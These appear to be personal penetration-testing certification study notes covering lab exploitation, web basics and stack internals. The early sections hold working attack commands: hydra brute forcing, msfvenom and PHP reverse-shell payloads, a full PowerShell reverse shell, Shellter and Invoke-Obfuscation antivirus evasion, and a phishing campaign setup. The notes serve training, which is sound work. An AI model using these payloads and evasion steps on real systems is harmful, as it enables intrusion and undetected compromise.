    In most cases, the FTP server is used to transfer files to and from the directory of the web server. As a result, if we are able to gain access to the FTP server, we may be able access the directory of the Microsoft IIS web server.
    nmap -sV -p21 --script=ftp-anon 10.0.28.97
    //If we need valid credentials, we could use hydra with different lists users/passwords or users/users
    ftp 10.0.28.97 21
    msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.2 LPORT=1234 -f asp > shell.aspx
  Targeting SMB
    enum4linux -u vagrant -p vagrant 10.10.16.3 //Enumerate other user accounts
    python3 psexec.py administrator@10.10.16.3
  Targeting mysql
    //Once we are in, we could change several things
      UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin'; //For example
    Change the content in phpmyadmin.conf to Allow from all
    //Once you have done changes regarding with Apache you have to restart this service. This can be done with
      net stop wampapache
      net start wampapache

Linux exploitation
  Brute force with SMTP to a vulnerable vsftpd 
    msfconsole -q
      search smtp_enum
    //Once you have some users
    hydra -l service -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt 10.2.17.5 ftp 
    //UPload a reverse shell 
    ls -al /usr/share/webshells/php-reverse-shell.php
    cp /usr/share/webshells/php-reverse-shell.php . //Change $ip and $port
    ftp 10.2.17.5 21
    cd /var/www/
    cd dav
    put shell.php //and nc -nvlp 1234 in our machine
  
  Targeting PHP
    10.2.19.172/phpinfo.php //Know some useful info with its version
    searchsploit php cgi //Lower than 5.3.12
    //We could use exploit/multi/http/php_cgi_arg_injection
    //If we try to modify 18836.py we could use this one liner to obtain a reverse shell
      $sock=fsockopen("IP",1234);exec("/bin/sh -i <&4 >&4 2>&4");

  Targeting Samba
   msfconsole -q
    search smb_version //It is valid for samba and smb
    use auxiliary/scanner/smb/smb_version  
AV evasion with Shelter
  Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include:
    - Uninstalling/disabling security software 
    - Obfuscating/encrypting data and scripts
    - Leverage and abuse trusted processes to hide and masquerade their malware
  //We are going to try to change the signature of the malicious executable that we are generating
  AV detection methods
    1. Signature based detection: An AV signature is a unique sequence of bytes that uniquely identifies malware. As a result, you will have to ensure that your obfuscated exploit or payload doesn't match any known signature in the AV database. 
      We can bypass signature-based detection by modifying the malware's byte sequence, therefore changing the signature
    2. Heuristic-based detection: Relies on rules or decisions to determine whether a binary is malicious. It also looks for specific patterns within the code or program calls
    3. Behavior based detection: Relies on identifying malware by monitoring it's behavior. Used for newer strains of malware
  AV evasion techniques
    On-disk evasion techniques
      1.  Obfuscation: Obfuscation relies to the process of concealing something important, valuable or critical. It reorganizes code in order to make it harder to analyze or RE
      2.  Encoding: Encoding data is a process involving changing data into a new format using a scheme. Encoding is a reversible process; data can be encoded to a new format and decoded to its original format
      3.  Packing: Generate executable with the new binary structure with a smaller size and therefore provides the payload with a new signature
      4.  Crypters: Encrypts code or payloads and decrypts the encrypted code in memory. The decryption key/function is usually stored in a stub
    In-Memory evasion techniques
      1.  Focuses on manipulation of memory and does not write files to disk
      2.  Injects payload into a process by leveraging various Windows APIs
      3.  Payload is then executed in memory in a separate thread
  Usage of shellter
    https://www.shellterproject.com/introducing-shellter/
    apt-get install shellter -y
    //We also need to install wine 32-bit package because shellter only supports any 32-bit payload (generated either by metasploit or custom ones by the user).
    dpkg --add-architecture i386
    apt-get install wine32
    //We could use the vncviewer.exe 
    cp /usr/share/windows-binaries/vncviewer.exe /home/kali/Desktop/AVBypass
    cd /usr/share/windows-resources/shellter
    sudo wine shellter.exe
      Auto mode
      /home/kali/Desktop/AVBypass/vncviewer.exe
      //Shellter will trace a random number of instructions 
      Enable Stealth Mode? Yes //If you want that executable work as intended.
      Payload? Listed payload 
      set lhost
      set lport
      msfconsole -q
        use multi/handler
        set payload windows/meterpreter/reverse_tcp
      python3 -m http.server 80
        //Execute it in the Windows machine 
  Obfuscating Powershell code
    git clone https://github.com/danielbohannon/Invoke-Obfuscation
    Use a reverse shell in powershell and save it as shell.ps1
      powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    apt-get install powershell -y
    pwsh
      cd ./Invoke-Obfuscation
      Import-Module ./Invoke-Obfuscation.ps1
      cd ..
      Invoke-Obfuscation
        SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
0-0-0-0-0-0-

Social Engineering 
  GoPhish
    1. New sending profile
      from: info <support@demo.ine.local>
      Host: localhost:25 //Where de stmp server is
      Username: red@demo.ine.local
    2. New landing page
      + Capture submitted data
      Redirect to: http://localhost:8080
    3. Email Templates
      Import email
    4. Users & Groups
      Import csv 
    5. Campaigns
      URL: http://localhost //It could be a cloud server

  
Web Application penetration testing: Introduction to the Web ahd HTTP protocol
  Intro to web
    //How to upload and delete files?
      curl 192.36.17.3/uploads/ --upload-file hello.txt
      curl -X DELETE 192.36.17.3/uploads/hello.txt
  Gobuster
    gobuster dir -u http://192.19.3.2 -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
  Nikto
    nikto -h http://192.158.187.3/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -Display V -o nikto.html -Format htm
  Passive crawler with BurpSuite
    Dashboard > Capturing 
  If with BurpSuite we have a header Authorization: Basic ==> We can base64-decode ==> Add Prefix to admin: ==> Add another payload processing to encode the payload to base64

-=-=-==============-----------------------------------------============
eWPT(Notes)
The Rules of Engagement
  Why do you want to execute a penetration tester?
  When creating a timetable, it should contain at least the following information:
    - Target(s)
    - Start (format: Date-time)
    - End   (format: Date-time)
    - Criticality of test(format: text) //Medium, High, Low
    - Step in process(format: text) //Scanning, OS detection, exploitation, etc
    - Source IP address
A non-disclosure agreement
An emergency plan involves:
  - The timetable
  - The contact in charge of responding to the emergency plan
  - The solutions to apply to the issue
Methodologies
  http://www.pentest-standard.org/index.php/Main_Page
  https://owasp.org/www-project-web-security-testing-guide/
The reporting phase
  Freemind(http://freemind.sourceforge.net/wiki/index.php/Download) //Mind mapping
  Your penetration test report's target audience groups are:
    - Executive: You have to speak in terms of metrics, risk mitigation and money loss
    - IT Department: Which areas or departments are more affected and to what kind of vulnerabilities
    - Development: Your exploits, your POCs, remediation tips, source code, etc
  A typical structure
    Executive summary(2-3 pages)
      //"The purpose of this assessment and report is to identify any web application issues that could affect ABC, Inc and the web server hosting it and to provide solutions to remedy these same issues. "
    Vulnerability report => Remediation report

Basics
  HTTP protocol basics
    Format of an HTTP message is
      HEADERS\r\n
      \r\n

      MESSAGE BODY\r\n

      \r(Carriage Return): moves the cursor to the beginning of the line
      \n(Line Feed): moves the cursor down to the next line
      \r\n: Is the same of hitting enter on your keyboard


    Note that a connection to www.google.com on port 80 is initiated before sending HTTP commands to the webserver
    HTTP Request:
      HTTP/1.1 ==> This is the HTTP protocol version that your browser wants to talk with. This basically informs the web server about which version of HTTP you would like to use in any further communication
      Host ==> It allows a web server to host multiple websites at a single IP address.
      Host value ==> Host value + Path combine to create the full URL you are requesting: the home page of www.google.com/
      User-Agent ==> Reveals your browser version, operating system and language to the remote web server
      Accept ==> Used by your browser to specify which document type is expected to be returned as a result of this request
      Accept-Encoding ==> Similar to accept, but it restricts the content codings that are acceptable in the response. Content codings are primarily used to allow a document to be compressed or transformed without losing the identity of its media type and without loss of information
      Connection ==> With HTTP 1.1 you can keep your connection to the remote web server open for an unspecified amount of time using the value "keep-alive". This indicates that all requests to the web server will continue to be sent through this connection without initiating a new connection every time (as in HTTP 1.0)

    HTTP response
      Date: Represents the date and time at which the message was originated
      Cache-Control: Allows the browser and the server to agree about caching rules. Cached contents save bandwidth because, in short, they prevent your browser from re-requesting contents that have not changed when the same resource is to be used.
      Content-Type: Lets the client know how to interpret the body of the message
      Content-Encoding: "gzip" Extends Content-Type. In this case the message body is compressed with gzip
      Server: "gws". Displays the web server banner. Apache and IIS are common web servers. Google uses this custom webserver banner (Google Web Server)
      Content-Length: Indicates the length, in bytes, of the message body
      
  Encoding
    Internet users, via their web browsers, request billions of pages every day. All of the content of these pages are displayed according to a charset. But what is a character set? It contains a set of characters: they represent the set of all symbols(What the user reads as he sees it on the screen) and code points(Numeric index, used to distinguish, unambiguosly, the symbol within the charset) that the end user can display in their browser window. //A symbol can be shown only if it exists in the charset. Examples of charsets are: ASCII(https://www.ascii-code.com/), Unicode(https://unicode-table.com/en/#0032)/UTF-8, UTF-16 and UTF-32(The numbers are the amount of bits used to represent code points), Latin-1 and so on

    HTML4 ==> <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"> //ISO-8859-1: "8-bit single-byte coded graphic character sets" aka Latin 1
    HTML5 ==> <meta charset="UTF-8">
    
    If you want to show symbols (like < > ) in your web document and you want to avoid the symbols being interpreted by your browser as HTML language elements, then you need to use the related entities(It is not a really security feature however, its use can limit most client side attacks. An HTML entity is simply a string (starting with & or &# and ending with ;) that corresponds with a symbol. When the browser encounters an entity in an HTML page it will show the symbol to the user and will not ever interpret the symbol as an HTML language element
    Character Reference       Rule                                            Encoded character
    Named entity              & + named character references + ;              &lt; 
    Numeric Decimal           & + # + D + ;                                   &#60;
                                D = a decimal number
    Numeric Hexadecimal       & + #x + H + ;                                  &#x3c;
                                H = an hexadecimal number (case-insensitive)  &#X3C;

    URL encoding(percent encoding)
      URLs sent over the Internet must contain characters in the range of the US-ASCII code character set. If unsafe characters are present in a URL, encoding theme is required. 
      This encoding is important because it limits the characters to be used in a URL to a subset of specific characters:
        1. Unreserver chars: [a-zA-Z] [0-9] [-._~]
        2. Reserved chars (they have a specific purpose): :/?#[]@!$&"()*+,;=%·
      Other characters are encoded by the use of a percent char (%) plus two hexadecimal digits. Reserved chars must be encoded when they have no special role inside the URL. A list of common encoded characters(https://www.w3schools.com/tags/ref_urlencode.asp)
        Character   Purpose in URI          Encoding
        #           Separate anchors        %23
        ?           Separate query string   %3F
        &           Separate query elements %26
        +           Indicates a space       %2B

    Base64 
      Is a binary-to-text encoding schema used to convert binary files and send them over Internet. For example, the e-mail protocol makes massive use of this encoding to attach files to messages. The HTML language permits the inclusion of some resources by using this encoding. For example, an image can be included in a page by inserting its binary content that has been converted to base64
      The alphabet of the Base64 encoding scheme is composed of:
        digits ==> [0-9]
        latin letters ==> [a-zA-Z] 
        + and /

  Same Origin Policy(SOP)
    This policy prevents a script or a document from getting or setting properties of another document that comes from a different origin. The primary purpose of SOP is to isolate requests coming from different origins.
    The main rule of SOP is:
      "A document(HTML page, an iframe included in the main page or a response to an Ajax request) can access (through JavaScript) the properties of another document only if they have the same origin" //More precisely, the browser always performs the request successfully but it returns the response to the user only if the SOP is respected.
    CSS stylesheets(*.css), images and scripts(*.js) are loaded by the browser without consulting the policy. SOP is consulted when cross-site HTTP requests are inititated from within client side scripts (IE: JavaScript), or when an Ajax request is run.
    The origin is defined by the following triplet:
      Protocol + Host + Port ==> http://www.elswapt.site
    Other example ==> http://els.wapt.site/index.php
      SOP OK ==> http://els.wapt.site/admin/index.php ==> Same protocol, host and port
      SOP not OK ==>  https://els.wapt.site/index.php ==> Different protocol
    Content from ... inherits the origin
      about:blank
      javascript:
      data: 
    !Internet explorer works a bit differently from other browsers. It has two exceptions:
      · Port: It does not consider the port as a Same Origin component
      · Trust zone: The same Origin is not applied to domains that are in highly trusted zone (i.e. corporate domains)
    What would it happen if SOP did not exist?

      Suppose you are logged in to your bank site and suppose your friend invites you to visit his new website. Your evil friend could build a crafted page, instigate you to visit it and once visited by you, access(some) personal information from your bank account
    Example 
      Let us suppose that index.html on domain a.elswapt.site (referred to as origin1: http://a.elswapt.site) wants to access via an Ajax request(hxr) the home.html page on domain b.elswapt.site (referred to as origin2: http://b.elswapt.site). 
      The document index.html on domain a.elswapt.site cannot access via an Ajax request (xhr) the home.html page on domain b.elswapt.site
    
    Exceptions
    	window.location: A document can always write the location property of another document. The window.Location object can be used to get the current page address (URL) and to redirect the browser to a new page
	document.domain
	Cross window messaging 
	Cross origin resource sharing (CORS)
	
	


   	







    
How to pase into web page fields that prevent copy and paste?
document.getElementById("paste-no").onpaste={};
document.getElementById("paste-no").onpaste=null;


Waiting for some web programming knowledge

-=-=-=-=-=-

eCPPTv2
Architecture fundamentals
CPU, ISA and Assembly
 	> CPU (Central Process Unit): Is the device in charge of executing the machine code of a program
 	> Machine code (= machine language): Set of instructions that the CPU processes. Each instruction is a primitive command that executes a specific operation such as move data, changes the execution flow of the program, perform arithmetic or logic operations and others. CPU instructions are represented in hexadecimal. Therefore, the same machine code gets translated into mnemonic code (a more readable language); this is called the assembly language (ASM). The assembler we are going to use is NASM
 	> Each CPU has its own instruction set architecture (ISA) that a programmer (or a compiler) must understand and use to write a program correctly for that specific CPU and machine. One of the most common ISA is the x86 instruction set from the Intel 8086. The x86 acronym identifies 32-bit processors, while x64(aka x86_64 or AMD64) identifies the 64-bit versions. 

Registers
	> The number of bits, 32 or 64, refers to the width of the CPU registers. Each CPU has its fixed set of registers that are accessed when required. You can think of registers as temporary variables used by the CPU to get and store data.
	> Although almost all registers are small portions of memory in the CPU and serve to store data temporarily, it is important to know that some of them have specific functions, while some others are used for general data storage. We will focus on a specific group of registers: The General Purpose Registers (GPRs)
	> 8 general purpose registers to the x86 architecture
	EAX => Accumulator 	==> Used in arithmetic operation
	ECX => Counter 		==> Used in shift/rotate instruction and loops
	EDX => Data 		==> Used in arithmetic operation and I/0
	EBX => Base		==> Used as a pointer to data
	ESP => Stack Pointer	==> Pointer to the top of the stack
	EBP => Base Pointer 	==> Pointer to the base of the stack (aka Stack Base Pointer or Frame pointer)
	ESI => Source Index	==> Used as a pointer to a source in stream operation
	EDI => Destination 	==> Used as a pointer to a destination in stream operation
	> The naming convention of the old 8-bit CPU had 16-bit register divided into two parts:
		- A low byte, identified by an L at the end of the name 
		- A high byte, identified by an H a the end of the name
		For example: AH|AL, CH|CL, DH|DL, BH|BL, SPL, BPL, SIL and DIL
	> The 16-bit naming convention combines the L and the H and replaces it with an X. While for Stack Pointer, Base Pointer, Source and Destination registers it simply removes the L
		For example: AX, CX, DX, BX, SP, BP, SI and DI
	> In the 32-bit representation, the register acronym is prefixed with an E, meaning extended
	> In the 64-bit representation, the E is replaced with the R
	> Another important register , the EIP (x86 naming convention). It controls the program execution by storing a pointer to the address of the next instruction (machine code) that will be executed. It tells the CPU where the next instruction is.

Process Memory
The process is divided into four regions: Text, Data, the Heap and the Stack
	> The Text region, or instruction segment, is fixed by the program and contains the program code (instructions). This region is marked as read-only since the program should not change during execution
	> The Data region is divided into initialized data and uninitialized data. Initialized data includes items such as static and global declared variables that are pre-defined and can be modified. 
		+ The unintialized data, named Block Started by Symbol(BSS) also initializes variables thata are initialized to zero or do not have explicit initialization(ex. static int t)
	> Next is the Heap, which starts right after the BSS segment. During the execution, the program can request more space in memory via 'brk' and 'sbrk' system calls, used by 'malloc', 'realloc' and 'free'. Hence, the size of the data region can be extended.
	> The last region of the memory is the Stack.

The Stack
· The Stack is a Last-in-First-out (LIFO) block of memory. It is located in the higher part of the memory. You can think of the stack as an array used for saving a function's return addresses, passing function arguments and storing variables. The purpose of the ESP register(Stack Pointer) is to identify the top of the stack and it is modified each time a value is pushed in (PUSH) or popped out (POP)
· The stack grows downwards, towards the lower memory addresses
· The Heap would start from lower addresses and grow upwards and the Stack would start from the end of the memory and grow downward.
· The first example of how the stack changes is the execution of the following instruction: PUSH E
· The second example is the execution of the following instruction: POP E
	PUSH Instruction
	· A PUSH instruction subtracts 4(in 32-bit) or 8(in 64-bit) from the ESP and writes the data to the memory address in the ESP and then updates the ESP to the top of the stack. Remember that the Stack grows backward. Therefore the PUSH subtracts 4 or 8 in order to point to a lower memory location on the stack. If we do not subtract it, the PUSH operation will overwrite the current location pointed by ESP (the top) and we would lose data.
	> The ESP points to the top of the stack -4
		ESP	A	==> PUSH (E) ==>	E 	ESP-4
			B				A
			C				B
			D				C
							D
	> A more detailed example of the PUSH instruction
 		+ Starting value (ESP contains the address value): ESP points to the following memory address: 0x0028FF80
		+ Process: The program executes the instruction PUSH 1. ESP decreases by 4, becoming 0x0028FF7C and the value 1 will be pushed on the stack
				      ...	==> PUSH 1 ==>	ESP = 0x0028FF7C ==> 00000001
		ESP = 0x0028FF80 => ..data..					     ..data..
				    ..data..					     ..data..
				    ..data..					     ..data..
	POP Instruction
	 POP PROCESS
	 · A POP is executed and the ESP register is modified
	 STARTING VALUE
	 · The ESP points to the top of the stack (Previous ESP +4)
	 PROCESS
	 · The POP operation is the opposite of PUSH and it retrieves data from the top of the Stack. Therefore, the data contained at the address location in ESP (the top of the stack) is retrieved and stored (usually in another register). After a POP operation, the ESP value is incremented in x86 by 4 or in x64 by 8.
	ENDING VALUE
 	> The ESP points to the top of the stack +4. (Same as the previous location before the PUSH)
 		ESP	E	==> POP (E) ==>		A 	ESP+4
 			A				B
 			B				C
 			C				D
 			D       			

	> A more detailed example of the POP instruction
 		+ Starting value (ESP contains the address value): After the PUSH 1 the ESP points to the following memory address: 0x0028FF7C
		+ Process: The program executes the instruction POP EAX. The value (00000001) contained at the address of the ESP (0x0028FF7C = the top of the Stack) will be popped out from the stack and will be copied in the EAX register. Then, ESP is updated by adding 4 and becoming 0x0028FF80.

										     00000001
		ESP = 0x0028FF7C => 00000001	==> POP EAX ==>	ESP = 0x0028FF80 ==> ..data.. 
		 	            ..data..					     ..data..
				    ..data..					     ..data..
				    ..data..
	Procedures and functions
	 > It is important to understand thtat the value popped from the stack is not deleted (or zeroed). It will stay in the stack until another instruction overwrites it.

· Now that we know more about the Stack, we will investigate how procedures and functions work. It is important to know that procedures and functions alter the normal flow of the process. When a procedure or a function terminates, it returns control to the statement or instruction that called the function.	

· Stack Frames
 > Functions contain two important components
  - Prologue: Prepares the stack to be used 
  - Epilogue: When the function has completed, the epilogue resets the stack to the prologue settings.
 > The Stack consists of logical stack frames (portions/areas of the Stack) that are PUSHed when calling a functions and POPped when returning a value.
 > When a subroutine, such as a function or procedure, is started, a stack frame is created and assigned to the current ESP location (top of the stack); this allows the subroutine to operate independently in its own location in the stack.
 > When the subroutine ends, 2 things happen:
  1. The program receives the parameters passed from the subroutine.
  2. The Instruction Pointer (EIP) is reset to the location at the time of the initial call.
  * In other words, the stack frame keeps track of the location where each subroutine should return the control when it terminates.
 > This process has tree main operations:
  1. When a function is called, the arguments [(in brackets)] need to be evaluated
  2. The control flow jumps to the body of the function and the program executes its code
  3. Once the function ends, a return statement is encountered, the program returns to the function call (the next statement in the code).
  # Example in C
  int b(){ //function b
          return 0;
  }
  int a(){ //function a
          b();
          return 0;
  }
  int main(){ //main function
          a();
          return 0;
  }
  ## Explanation
  #Higher memory address(To upwards)Lower memory address.
  · Step 1:
  	+ The entry point of the program is main()
	+ The first stack frame that needs to be pushed to the Stack is the main() stack frame. Once initialized, the stack pointer is set to the top of the stack and a new main() stack frame is created.
  · Step 2:
  	+ Once inside main(), the first instruction that executes is a call to the function named a(). Once again, the stack pointer is set to the top of the stack of main() and a new stack frame for a () is created on the stack.
  · Step 3:
  	+ Once the function a() starts, the first instruction is a call to the function named b(). Here again, the stack pointer is set and a new stack frame for b() will be pushed on the top of the stack.
  · Step 4:
  	+ The function b() does nothing and just returns. When the function completes, the stack pointer is moved to its previous location and the program returns to the stack frame of a() and continues with the next instruction.
  · Step 5:
  	+ The next instruction executed is the return statement contained in a(). The a() stack frame is popped, the stack pointer is reset and we will get back in the main() stack frame.
  ## Another example related with Buffer Overflow.
  void functest(int a, int b, int c)  {
          int test1 = 55;
          int test2 = 56;
  }
  int main(int argc, char * argv[]) {
          int x = 11;
          int z = 12;
          int y = 13;
          functest(30,31,32);
          return 0;
  }
  ##Explanation
  · Step 1:
  	+ When the program starts, the function main() parameters (argc, argv) will be pushed on the stack from right to left. 
		argc
		argv
		...
  · Step 2:	
	+ CALL the function main(). Then, the processor PUSHes the content of the EIP(Instruction Pointer) to the stack and points to the first byte after the CALL instruction.
	+ This process is important because we need to know the address of the next instruction in order to proceed when we return from the function called.
  · Step 3:
  	+ The caller (the instruction that executes the function calls - the OS in this case) loses its control and the calle (the function that is called - the main function) takes control.
		old EIP  //Return address from main(). The next instruction to execute once we return from main.
		argc
		argv
		...
  · Step 4:
  	+ Now that we are in the main() function, a new stack frame needs to be created. The stack frame is defined by the EBP (Base Pointer) and the ESP (Stack pointer). Because we don't want to lose the old stack frame information, we have to save the current EBP on the Stack. If we did not do tis, when we returned, we will not know that this information belonged to the previous stack frame, the function that called main(). Once its value is stored , the EBP is updated and it points to the top of the stack
		old EBP //Contains the base pointer of the caller. At this time, both EBP and ESP points at the 
		old EIP   |
		argc	  |	Old stack frame
		argv      |
		...       | 
 · Prologue
 	It is a sequence of instructions that take place at the beginning of a function. This will occur for all functions. Once the callee gets the control, it will execute the following instructions:
	1 push ebp
	2 mov ebp, esp
	3 sub esp, X // X is a number
	
	##Explanation
	The first instruction(push ebp) saves the old base pointer onto the stack,so it can be restored later on when the function returns.
	EBP is currently pointing to the location of the top of the previous stack frame.
	----
	The second instruction (mov ebp, esp) copies the value of the Stack pointer (ESP - top of the stack) into the base pointer (EBP); this creates a new stack frame on top of the Stack.
	 + The base of the new stack frame is on top of the old stack frame
	 + Important: Notice that in assembly, the second operand of the instruction (esp in this case) is the source, while the first operand (ebp in this case) is the destination. Hence, esp is moved into ebp.
		
	The last instruction (sub esp, X) moves the Stack Pointer (top of the stack) by decreasing its value, this is necessary to make space for the local variables.
	 + Similar to the previous instruction, X is the source and esp is the destination. Therefore, the instruction subtracts X from esp (this X is not the int variable X from the program)
	 + The third instruction creates enough space in the stack to copy local variables. Variables are allocated by decreasing the stack pointer (top of the stack) by the amount of space required.
	 + Remember that the stack grows backward. Therefore, we have to decrease its value to expand the stack frame
	
	 + This represents the Stack once the prologue has happened.
	   Lower memory address					     <= [ESP-X]
	   	To			...
	   	[Upward]		EBP-8
	   	From			EBP-4	
	   Higher memory address	EBP+0	old EBP (caller EBP) <= EBP
	   				EBP+4	old EIP
	   				EBP+8	argc	
	   				...	argv
	   					...
	 	=> Notice that since the main function contains other variables and a function call, the actual stack frame for the main() subroutine is slightly bigger.
	 + Once the prologue ends, the stack frame for main() is complete and the local variables are copied to the stack. Since ESP is not pointing to the memory address right after EBP, we cannot use the PUSH operation, since PUSH stores the value on top of the stack (the addresss pointed by ESP).
	 + The variable is a hexadecimal value that is an offset from the base pointer (EBP) or the stack pointer (ESP)
	 + The instructions after the prologue are like the following:
	 	MOV DWORD PTR SS:[ESP+Y],0B
		> This instruction means: move the value 0B (hexadecimal of 11 - the first local variable) into the memory address location pointed at ESP+Y. Note that Y is a number and ESP+Y points to a memory address between EBP and ESP.
	 + This process will repeat through all the variables and once the process completes, the stack will look like the following

	   Lower memory address					     <= ESP
	   	To			...	13 (y)
	   	[Upward]		EBP-8	12 (z)
	   	From			EBP-4	11 (x)		     <= [ESP+Y]
	   Higher memory address	EBP+0	old EBP (caller EBP) <= EBP
	   				EBP+4	old EIP
	   				EBP+8	argc	
	   				...	argv
	   					...
	 + Then the main() continues executing its instructions.

  · Step 5
  	+ The next instruction calls the function functest().
	+ The whole process will be executed again. This time a new stack frame will be created for the function functest().
	The process looks like the following:
		> PUSH the function parameters in the stack
		> Call the function functest()
		> Execute the prologue (which will update EBP and ESP to create the new stack frame)
		> Allocate local variables onto the stack.
	+ The following is how the stack looks like at the end of the entire process.
		Functest Stack Frame	56		<- ESP
					55
					Old EBP (main)  <- EBP
		Main Stack Frame	old EIP
					30
					31
					32
					...
					13(y)
					12(z)
					11(x)
					old EBP
		OS Stack Frame		old EIP
					argc 
					argv
					...

1.2.4.6 Epilogue
 + We have seen how the stack frames are created. Now, we have to understand how they are destroyed. What happens when the code executes a return statement and the control goes back to the previous procedure (and stack frame)?
 + When the program enters a function, the prologue is executed to create the new stack frame
 + When the program executes a return statement, the previous stack frame is restored thanks to the epilogue.
 + The operations executed by the epilogue are the following:
 	 · Return the control to the caller
	 · Replace the stack pointer with the current base pointer. It restores its value to before the prologue; this is done by POPping the base pointer from the stack.
	 · Returns to the caller by POPping the instruction pointer from the stack (stored in the stack) and then it jumps to it.
 + The following code represents the epilogue:
 	leave 
	ret
 + The instructions can also be written as follows:
 	mov esp, ebp
	pop ebp
	ret
 + This is what happens to the previous stack when the function functest() ends. Notice that even if the code does not contain a return, when the program leaves a subroutine it will still run the epilogue.
					...
		Main Stack Frame ESP ->	Old EBP (main)  <- EBP
					old EIP
					30
					31
					32
					...
					13(y)
					12(z)
					11(x)
					old EBP
		OS Stack Frame		old EIP
					argc 
					argv
					...
 + The first instruction in the epilogue is mov esp, ebp. After it gets executed; both ESP and EBP point to the same location.
 + The next instruction is pop ebp, which simply POPS the value from the top of the stack into EBP. Since the top of the Stack points to the memory address location where the old EBP is stored (the EBP of the caller), the caller stack frame is restored.
 + It is important to know that a POP operation automatically updates the ESP (same as the PUSH).
 + Therefore, ESP now points to the old EIP previously stored
					...
					Old EBP (main)  
		Main Stack Frame	old EIP		<- ESP
					30
					31
					32
					...
					13(y)
					12(z)
					11(x)
					old EBP 	<- EBP
		OS Stack Frame		old EIP
					argc 
					argv
					...
 + The last instruction that the epilogue will execute is ret. RET pops the value contained at the top of the stack to the old EIP - the next instruction after the caller and jumps to that location. This gives control back to the caller. RET affects only the EIP and the ESP registers.

1.2.5 Endianness
 + Endianness is the way of representing (storing) values in memory.
 + Even though there are three types of endianness, we will explain only two of them, the most important ones: big-endian and little-endian.
 > First, it is important to know these two concepts:
 	· The most significant bit (MSB) in a binary number is the largest value, usually the first from the left. So, for example, considering the binary number 100 the MSB is 1.
	· The least significant bit (LSB) in a binary number is the lowest value, usually the first from the right. So, for example, considering the binary number 110 the LSB is 0.
 + In the big-endian representation, the least significant byte (LSB) is stored at the highest memory address. While the most significant byte (MSB) is at the lowest memory address.
 	· Example: the 0x12345678 value is represented as:
		Highest memory	Address in memory	Byte value
				+0			0x12
				+1			0x34
				+2			0x56
		Lowest memory	+3			0x78
 + Respectively, in the little-endian representation, the least significant byte (LSB) is stored at the lower memory address, while the most significant byte is at the highest memory address. 
 	· Example: the 0x12345678 is represented in memory as:
		Highest memory	Address in memory	Byte value
				+0			0x78
				+1			0x56
				+2			0x34
		Lowest memory	+3			0x12
 + Here's another example. Let us consider the value 11 (0B in hexadecimal). The example system is using little-endian representation; therefore, the LSB is stored in the lower memory address or MSB is stored at the highest memory address.
 + Using the previous table, we will have the following
		Highest memory	Address in memory	Byte value
				+0			0x0B
				+1			0x00
				+2			0x00
		Lowest memory	+3			0x00
 + Remember that the most significant byte is stored at the highest memory address and since the stack grows backward (towards lower addresses), the most significant byte (0B in this case) will be stored on the "left" (0028FEBF - the highest memory address)

1.2.6 NOPs
+ Another important topic is the No Operation instruction (NOP)
+ NOP is an assembly language instruction that does nothing. When the program encounters a NOP, it will simply skip to the next instruction. In Intel x86 CPUs, NOP instructions are represented with the hexadecimal value 0x90
+ NOP-sled is a technique used during the exploitation process of Buffer Overflows. Its only purpose is to fill a large (or small) portion of the stack with NOPs; this will allow us to slide down to the instruction we want to execute, which is usually put after the NOP-sled.
+ The reason is because Buffer Overflows have to match a specific size and location that the program is expecting.



Continue...
-=-=-=
Meanwhile (HTB academy fundamentals modules)
Penetration testing phases (Introduction)
1. Pre-Engagement
	Types of Testing environments
		Network 	Web App 	Mobile 	API 	Thick Clients
		IoT 	Cloud 	Source Code 	Physical Security 	Employees
		Hosts 	Server 	Security Policies 	Firewalls 	IDS/IPS
	
	Document							Timing for Creation
	1. Non-Disclosure Agreement (NDA)				After Initial Contact
	2. Scoping Questionnaire					Before the Pre-Engagement Meeting
	3. Scoping Document						During the Pre-Engagement Meeting
	4. Penetration Testing Proposal (Contract/Scope of Work (SoW))	During the Pre-engagement Meeting
	5. Rules of Engagement (RoE)					Before the Kick-Off Meeting
	6. Contractors Agreement (Physical Assessments)			Before the Kick-Off Meeting
	7. Reports							During and after the conducted Penetration Test
	
	
	Aside from the assessment type, client name, address, and key personnel contact information, some other critical pieces of information include:
		
	How many expected live hosts? 	
	How many IPs/CIDR ranges in scope? 	
	How many Domains/Subdomains are in scope? 	
	How many wireless SSIDs in scope? 	
	How many web/mobile applications? If testing is authenticated, how many roles (standard user, admin, etc.)? 	
	For a phishing assessment, how many users will be targeted? Will the client provide a list, or we will be required to gather this list via OSINT? 	
	If the client is requesting a Physical Assessment, how many locations? If multiple sites are in-scope, are they geographically dispersed? 	
	What is the objective of the Red Team Assessment? Are any activities (such as phishing or physical security attacks) out of scope? 	
	Is a separate Active Directory Security Assessment desired? 	
	Will network testing be conducted from an anonymous user on the network or a standard domain user? 	
	Do we need to bypass Network Access Control (NAC)?

2. Information gathering
2.1 Categories	
    Open-Source Intelligence
    Infrastructure Enumeration: This includes name servers, mail servers, web servers, cloud instances, and more. We make an accurate list of hosts and their IP addresses and compare them to our scope to see if they are included and listed.
    Service Enumeration
    Host Enumeration
2.2 Interesting websites 
	https://searchcode.com/

3. Vulnerability assessment
3.1. Different sources
	https://www.cvedetails.com/
	https://packetstormsecurity.com/
	https://www.exploit-db.com/
	https://nvd.nist.gov/vuln/search?execution=e2s1
	https://www.securityfocus.com/vulnerabilities
	https://vulners.com/
	https://www.rapid7.com/db/
	https://www.vulnerability-lab.com/

4. Exploitation
	https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
5. Post-Exploitation
	Pillaging is the stage where we examine the role of the host in the corporate network. We analyze the network configurations, including but not limited to:
